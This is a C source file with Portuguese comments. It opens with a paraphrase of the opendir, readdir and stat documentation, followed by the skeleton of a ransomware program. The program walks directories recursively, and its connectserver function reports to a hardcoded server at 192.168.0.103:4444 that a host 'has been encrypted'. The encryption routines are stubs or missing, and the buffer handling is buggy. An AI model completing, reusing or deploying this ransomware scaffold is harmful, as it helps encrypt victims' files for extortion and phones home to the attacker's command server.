/*
struct dirent {
    ino_t          d_ino;      
	off_t          d_off;      
	unsigned short d_reclen;   
	unsigned char  d_type;     

	char           d_name[256]; 
};
Funçao: DIR *opendir(const char *name);
	Preliminares: | MT-Safe | Pilha AS-insegura 
				  | AC-Unsafe mem fd | Consulte os Conceitos de segurança POSIX .

	A opendirfunção abre e retorna um fluxo de diretório para ler o 
	diretório cujo nome de arquivo é dirname . O fluxo tem tipo DIR *.

	Se malsucedido, opendir retorna um ponteiro nulo. Além dos erros usuais de nome
	de arquivo (consulte Erros de nome de arquivo ), as seguintes errnocondições de erro
	são definidas para esta função:

	EACCES
		A permissão de leitura foi negada para o diretório nomeado por dirname.

	EMFILE
		O processo tem muitos arquivos abertos.

	ENFILE
		O sistema inteiro, ou talvez o sistema de arquivos que contém o diretório, não pode suportar
		nenhum arquivo aberto adicional no momento. (Este problema não pode acontecer em sistemas GNU / Hurd.)

	ENOMEM
		Memória insuficiente disponível.

Função: struct dirent * readdir (DIR * dirstream )
	Preliminares: | MT-Safe | Fechadura AS-Insegura | Bloqueio AC-Inseguro | Consulte os Conceitos de segurança POSIX .
	Esta função lê a próxima entrada do diretório. Normalmente retorna um ponteiro 
	para uma estrutura que contém informações sobre o arquivo. Essa estrutura está 
	associada ao identificador dirstream e pode ser 
	reescrita por uma chamada subsequente.

struct stat {
    dev_t     st_dev;     ID of device containing file
    ino_t     st_ino;     inode number
    mode_t    st_mode;    protection 
    nlink_t   st_nlink;   number of hard links 
    uid_t     st_uid;     user ID of owner 
    gid_t     st_gid;     group ID of owner 
    dev_t     st_rdev;    device ID (if special file) 
    off_t     st_size;    total size, in bytes 
    blksize_t st_blksize; blocksize for file system I/O 
    blkcnt_t  st_blocks;  number of 512B blocks allocated 
    time_t    st_atime;   time of last access 
    time_t    st_mtime;   time of last modification 
    time_t    st_ctime;   time of last status change 
};
O campo st_dev descreve o dispositivo no qual este arquivo reside. (As macros principais (3) 
e secundárias (3) podem ser úteis para decompor o ID do dispositivo neste campo.)
O campo st_rdev descreve o dispositivo que este arquivo (inode) representa.

O campo st_size fornece o tamanho do arquivo (se for um arquivo normal ou um link simbólico) 
em bytes. O tamanho de um link simbólico é o comprimento do nome 
do caminho que ele contém, sem um byte nulo final.

O campo st_blocks indica o número de blocos alocados para o arquivo, 
unidades de 512 bytes. (Isso pode ser menor do que st_size / 512
 quando o arquivo tem buracos.)

O campo st_blksize fornece o tamanho de bloco "preferido" para E / S 
eficiente do sistema de arquivos. (Gravar em um arquivo em partes menores 
pode causar uma leitura-modificação-reescrita ineficiente.)

Nem todos os sistemas de arquivos Linux implementam todos os campos de tempo. Alguns 
tipos de sistema de arquivos permitem a montagem de forma que os acessos a arquivos e / 
ou diretórios não causem uma atualização do campo st_atime . (Consulte noatime , 
nodiratime e relatime em mount (8) e informações relacionadas em mount (2).) 
Além disso, st_atime não é atualizado se um arquivo 
for aberto com o O_NOATIME ; veja aberto (2).

O campo st_atime é alterado por acessos a arquivos, por exemplo, por execve (2), 
mknod (2), pipe (2), utime (2) e read (2) (de mais de zero bytes). 
Outras rotinas, como mmap (2), podem ou não atualizar st_atime .

O campo st_mtime é alterado por modificações de arquivo, por exemplo, 
por mknod (2), truncate (2), utime (2) e write (2) (de mais de zero bytes). 
Além disso, o st_mtime de um diretório é alterado pela criação ou exclusão de 
arquivos nesse diretório. O campo st_mtime não é alterado para alterações 
no proprietário, grupo, contagem de link físico ou modo.

O campo st_ctime é alterado escrevendo ou configurando informações 
de inode (ou seja, proprietário, grupo, contagem de links, modo, etc.).

As seguintes macros POSIX são definidas para verificar o tipo de arquivo usando o campo st_mode :

S_ISREG (m)
é um arquivo normal?

S_ISDIR (m)

diretório?

S_ISCHR (m)

dispositivo de personagem?

S_ISBLK (m)

bloquear dispositivo?

S_ISFIFO (m)

FIFO (pipe nomeado)?

S_ISLNK (m)

link simbólico? (Não em POSIX.1-1996.)

S_ISSOCK (m)

soquete? (Não em POSIX.1-1996.)


*/
#include <stdio.h>  // Entrada e saida padrao de dados
#include <stdlib.h> // Biblioteca padrao
#include <string.h> // Tratar strings
#include <dirent.h> // Entrada de diretorios
#include <errno.h> 
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
struct dirent *getdir;

#define myhost "192.168.0.103"
#define myport 4444
const unsigned long KILOBYTE = 1024;


//Funçao que avisa o servidor que algum host foi criptografado
void connectserver();
//Funçao que faz a criptografia dos nomes de arquivo/diretorio
void encryptname(char *encryptfile);
//Funçao que faz a criptografia de arquivos
void encryptfile(char *encryptfile);
//Funçao que procura arquivos & diretorios
void WhatIsDir(char *name_dir);


//Funçao principal
int main(int argc, char *argv[]){
	int status;
	if(argc != 2 ){
		fprintf(stderr, "Use: %s [DIRETORIO]", argv[0]);
		return 1;
	}

	WhatIsDir(argv[1]);

	return 0;
}

void WhatIsDir(char *dir_sch){
	/* Data Type: DIR
	 * The DIR data type represents a directory stream.
     */
	DIR *diretorio;
	char concatena[KILOBYTE];
	int isdir;
	struct stat buf;
	// Function: DIR * opendir (const char *dirname)
	diretorio = opendir(dir_sch);
	
	if(diretorio == NULL){
		fprintf(stderr, "[INFO]: Ocorreu um erro ao abrir diretorio: %s\n", dir_sch);;
		
	}else{
		//readdir esta sendo explicada no cabeçalho do codigo!
		while((getdir = readdir(diretorio)) != NULL){
			//Verifica se o diretorio guardado na d_name é .. ou .
			if(strncmp(getdir->d_name, ".", sizeof(getdir->d_name)) == 0 || 
			strncmp(getdir->d_name, "..", sizeof(getdir->d_name)) == 0) continue;
			//Concatenando diretorios com arquivos, etc

			memcpy(concatena, dir_sch, sizeof(concatena));
			strncat(concatena, getdir->d_name,sizeof(concatena));
			printf("%s\n",concatena);

			//int stat(const char *path, struct stat *buf);
			stat(concatena, &buf);
			//As seguintes macros POSIX são definidas para verificar o tipo de arquivo usando o campo st_mode :
			if(S_ISDIR(buf.st_mode)){
				strncat(concatena, "/", sizeof(concatena));
				printf("DIRETORIO--> %s\n", concatena);
				WhatIsDir(concatena);
			}else
				printf("ARQUIVO--> %s\n", concatena);
		}
		closedir(diretorio);
	}
}
void connectserver(){
	int sockfd;
	int status;
	char buffer[100] = "[INFO] UM HOST FOI CRIPTOGRAFADO :]\n";
	char ip[30];
	struct sockaddr_in my_addr = {
		.sin_family = AF_INET,
		.sin_port = htons(myport),
		.sin_addr.s_addr = inet_addr(myhost),	
	};

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if(sockfd < 0){
		printf("[INFO] Ocorreu um erro ao tentar criar o socket!");
	}
	status = connect(sockfd, (struct sockaddr *)&my_addr, sizeof(my_addr));
	if(status < 0){
		printf("[INFO] Ocorreu um erro ao tentar se connectar ao servidor!");
	}
	send(sockfd, buffer, sizeof(buffer), 0);
}
void encryptfile(char *name_dir){
	//RETURN 0;
}

